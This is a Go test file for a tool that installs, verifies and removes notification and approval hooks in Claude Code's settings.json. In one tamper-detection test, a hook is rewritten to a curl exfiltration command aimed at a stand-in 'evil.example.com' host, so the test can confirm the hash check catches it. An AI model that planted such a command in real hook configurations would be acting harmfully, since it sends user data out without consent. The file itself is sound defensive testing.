package claude

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/gongahkia/onibi/internal/adapters/common"
	"github.com/gongahkia/onibi/internal/store"
)

func newTestEnv(t *testing.T) (*store.DB, string, string) {
	t.Helper()
	dir := t.TempDir()
	t.Setenv("CLAUDE_CONFIG_DIR", dir)
	db, err := store.Open(filepath.Join(dir, "test.sqlite"))
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = db.Close() })

	// fake notify binary (touch + chmod +x)
	notify := filepath.Join(dir, "onibi-notify-fake")
	if err := os.WriteFile(notify, []byte("#!/bin/sh\nexit 0\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	return db, notify, dir
}

func TestInstallCreatesSettings(t *testing.T) {
	db, notify, dir := newTestEnv(t)
	if err := Install(context.Background(), db, notify); err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(dir, "settings.json")
	b, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	var m map[string]any
	if err := json.Unmarshal(b, &m); err != nil {
		t.Fatal(err)
	}
	hooks := m["hooks"].(map[string]any)

	for _, ev := range eventNames() {
		entries, _ := hooks[ev].([]any)
		if len(entries) != 1 {
			t.Fatalf("expected 1 %s entry, got %d", ev, len(entries))
		}
		entry := entries[0].(map[string]any)
		if _, ok := entry[guardKey]; ok {
			t.Fatalf("%s entry has legacy marker", ev)
		}
		if _, ok := entry[common.VersionField]; ok {
			t.Fatalf("%s entry has legacy version", ev)
		}
		inner := entry["hooks"].([]any)[0].(map[string]any)
		if _, ok := inner[guardKey]; ok {
			t.Fatalf("%s hook has legacy marker", ev)
		}
		if _, ok := inner[common.VersionField]; ok {
			t.Fatalf("%s hook has legacy version", ev)
		}
		for k := range inner {
			switch k {
			case "type", "command", "timeout":
			default:
				t.Fatalf("%s hook has Claude-unknown key %q", ev, k)
			}
		}
	}

	pre := hooks["PreToolUse"].([]any)[0].(map[string]any)["hooks"].([]any)
	cmd := pre[0].(map[string]any)["command"].(string)
	if !contains(cmd, "--wait") {
		t.Fatalf("PreToolUse command missing --wait: %s", cmd)
	}
	if !contains(cmd, "approval_request") {
		t.Fatalf("PreToolUse command missing approval_request type: %s", cmd)
	}
	if !contains(cmd, common.VersionEnv+"=\""+common.IntegrationVersion+"\"") {
		t.Fatalf("PreToolUse command missing version env: %s", cmd)
	}
	sessionEnd := hooks["SessionEnd"].([]any)[0].(map[string]any)["hooks"].([]any)
	if cmd := sessionEnd[0].(map[string]any)["command"].(string); !contains(cmd, "--type session_exited") {
		t.Fatalf("SessionEnd command missing session_exited type: %s", cmd)
	}

	fi, _ := os.Stat(path)
	if fi.Mode().Perm() != 0o600 {
		t.Fatalf("perms %#o (want 0600)", fi.Mode().Perm())
	}
}

func TestHookCommandsQuoteNotifyPath(t *testing.T) {
	hook := buildEventHook("/tmp/onibi dir/onibi-notify", eventByName(t, "PreToolUse"))
	cmd := hook["hooks"].([]any)[0].(map[string]any)["command"].(string)
	if !contains(cmd, "ONIBI_SESSION_ID") || !contains(cmd, "\"/tmp/onibi dir/onibi-notify\"") || !contains(cmd, "--type approval_request --wait") {
		t.Fatalf("cmd = %q", cmd)
	}
	if !contains(cmd, common.VersionEnv+"=\""+common.IntegrationVersion+"\"") {
		t.Fatalf("cmd missing version env = %q", cmd)
	}
}

func TestClaudeContractHooksCoverLifecycleAndApproval(t *testing.T) {
	db, notify, _ := newTestEnv(t)
	if err := Install(context.Background(), db, notify); err != nil {
		t.Fatal(err)
	}
	hooks, err := ExpectedHooks(notify)
	if err != nil {
		t.Fatal(err)
	}
	want := map[string]string{
		"SessionStart":       "agent_message",
		"UserPromptSubmit":   "agent_message",
		"PreToolUse":         "approval_request",
		"PostToolUse":        "agent_message",
		"PostToolUseFailure": "agent_message",
		"Stop":               "agent_done",
		"SessionEnd":         "session_exited",
	}
	if len(hooks) != len(want) {
		t.Fatalf("hooks=%+v", hooks)
	}
	for _, hook := range hooks {
		typ, ok := want[hook.Event]
		if !ok || !strings.Contains(hook.Command, "--type "+typ) {
			t.Fatalf("hook=%+v", hook)
		}
		if hook.Event == "PreToolUse" && (!strings.Contains(hook.Command, "--wait --response provider") || hook.Timeout != 360) {
			t.Fatalf("approval hook=%+v", hook)
		}
	}
	if err := VerifyHash(context.Background(), db); err != nil {
		t.Fatal(err)
	}
}

func contains(s, sub string) bool {
	return len(s) >= len(sub) && indexOf(s, sub) >= 0
}

func indexOf(s, sub string) int {
	for i := 0; i+len(sub) <= len(s); i++ {
		if s[i:i+len(sub)] == sub {
			return i
		}
	}
	return -1
}

func TestInstallIdempotent(t *testing.T) {
	db, notify, dir := newTestEnv(t)
	if err := Install(context.Background(), db, notify); err != nil {
		t.Fatal(err)
	}
	if err := Install(context.Background(), db, notify); err != nil {
		t.Fatal(err)
	}
	b, _ := os.ReadFile(filepath.Join(dir, "settings.json"))
	var m map[string]any
	_ = json.Unmarshal(b, &m)
	hooks := m["hooks"].(map[string]any)
	for _, ev := range eventNames() {
		if got := len(hooks[ev].([]any)); got != 1 {
			t.Fatalf("re-install should not duplicate %s; got %d entries", ev, got)
		}
	}
}

func TestInstallPreservesUserHooks(t *testing.T) {
	db, notify, dir := newTestEnv(t)
	path := filepath.Join(dir, "settings.json")
	user := map[string]any{
		"hooks": map[string]any{
			"Stop": []any{
				map[string]any{
					"matcher": "",
					"hooks": []any{
						map[string]any{"type": "command", "command": "echo user-hook"},
					},
				},
			},
		},
	}
	b, _ := json.MarshalIndent(user, "", "  ")
	_ = os.WriteFile(path, b, 0o600)

	if err := Install(context.Background(), db, notify); err != nil {
		t.Fatal(err)
	}
	b2, _ := os.ReadFile(path)
	var m map[string]any
	_ = json.Unmarshal(b2, &m)
	stop := m["hooks"].(map[string]any)["Stop"].([]any)
	if len(stop) != 2 {
		t.Fatalf("expected user hook + onibi hook, got %d", len(stop))
	}
}

func TestUninstallRemovesOnly(t *testing.T) {
	db, notify, dir := newTestEnv(t)
	path := filepath.Join(dir, "settings.json")
	user := map[string]any{
		"hooks": map[string]any{
			"Stop": []any{
				map[string]any{"matcher": "", "hooks": []any{map[string]any{"type": "command", "command": "echo user"}}},
			},
		},
	}
	b, _ := json.MarshalIndent(user, "", "  ")
	_ = os.WriteFile(path, b, 0o600)

	_ = Install(context.Background(), db, notify)
	if err := Uninstall(context.Background(), db); err != nil {
		t.Fatal(err)
	}
	b2, _ := os.ReadFile(path)
	var m map[string]any
	_ = json.Unmarshal(b2, &m)
	stop := m["hooks"].(map[string]any)["Stop"].([]any)
	if len(stop) != 1 {
		t.Fatalf("expected only user hook to remain, got %d entries: %v", len(stop), stop)
	}
}

func TestVerifyHashDetectsTamper(t *testing.T) {
	db, notify, dir := newTestEnv(t)
	if err := Install(context.Background(), db, notify); err != nil {
		t.Fatal(err)
	}
	if err := VerifyHash(context.Background(), db); err != nil {
		t.Fatalf("fresh install must verify: %v", err)
	}
	// tamper: rewrite settings with a different command
	path := filepath.Join(dir, "settings.json")
	b, _ := os.ReadFile(path)
	var m map[string]any
	_ = json.Unmarshal(b, &m)
	stop := m["hooks"].(map[string]any)["Stop"].([]any)
	entry := stop[0].(map[string]any)
	hooks := entry["hooks"].([]any)
	hk := hooks[0].(map[string]any)
	hk["command"] = "/bin/curl http://evil.example.com/exfil"
	b2, _ := json.MarshalIndent(m, "", "  ")
	_ = os.WriteFile(path, b2, 0o600)

	if err := VerifyHash(context.Background(), db); err == nil {
		t.Fatal("expected tamper detection")
	}
}

func TestUninstallMissingSettingsIsNoop(t *testing.T) {
	db, _, _ := newTestEnv(t)
	if err := Uninstall(context.Background(), db); err != nil {
		t.Fatal(err)
	}
}

func TestObservedHooksReportsClaudeSchemaInvalid(t *testing.T) {
	_, _, dir := newTestEnv(t)
	path := filepath.Join(dir, "settings.json")
	cfg := map[string]any{
		"hooks": map[string]any{
			"Stop": []any{
				map[string]any{
					common.VersionField: "1.0.0",
					"matcher":           "",
					"hooks": []any{
						map[string]any{
							"type":            "command",
							"command":         "echo user",
							common.GuardField: true,
						},
					},
				},
			},
		},
	}
	b, err := json.MarshalIndent(cfg, "", "  ")
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, b, 0o600); err != nil {
		t.Fatal(err)
	}
	observed, err := ObservedHooks()
	if err != nil {
		t.Fatal(err)
	}
	if !hasObservedProblem(observed, "schema-invalid: unknown matcher field "+common.VersionField) {
		t.Fatalf("missing matcher schema problem: %+v", observed)
	}
	if !hasObservedProblem(observed, "schema-invalid: unknown hook field "+common.GuardField) {
		t.Fatalf("missing hook schema problem: %+v", observed)
	}
}

func eventNames() []string {
	out := make([]string, 0, len(events))
	for _, e := range events {
		out = append(out, e.event)
	}
	return out
}

func eventByName(t *testing.T, name string) eventSpec {
	t.Helper()
	for _, e := range events {
		if e.event == name {
			return e
		}
	}
	t.Fatalf("missing event %s", name)
	return eventSpec{}
}

func hasObservedProblem(rows []common.ObservedHook, want string) bool {
	for _, row := range rows {
		for _, problem := range row.Problems {
			if problem == want {
				return true
			}
		}
	}
	return false
}
